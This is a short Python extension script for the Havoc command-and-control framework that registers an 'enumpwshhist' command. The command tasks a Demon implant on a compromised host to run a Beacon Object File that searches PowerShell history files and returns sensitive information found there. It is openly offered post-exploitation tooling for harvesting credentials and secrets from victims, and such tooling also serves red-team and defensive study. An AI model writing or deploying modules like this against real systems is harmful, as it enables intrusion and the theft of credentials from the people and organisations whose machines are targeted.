#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: fyxme

from havoc import Demon, RegisterCommand

def enumpwsh( demonID, *param ):
    TaskID : str = None

    demon : Demon = None
    demon = Demon(demonID)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Enumerating powershell history for all reachable directories" )
    demon.InlineExecute( TaskID, "go", "./bin/enumpwshhist.bof.o", b'', True)

    return TaskID

RegisterCommand( enumpwsh, "", "enumpwshhist", "Enumerate PowerShell history files and return sensitive information found", 0, "", "" )

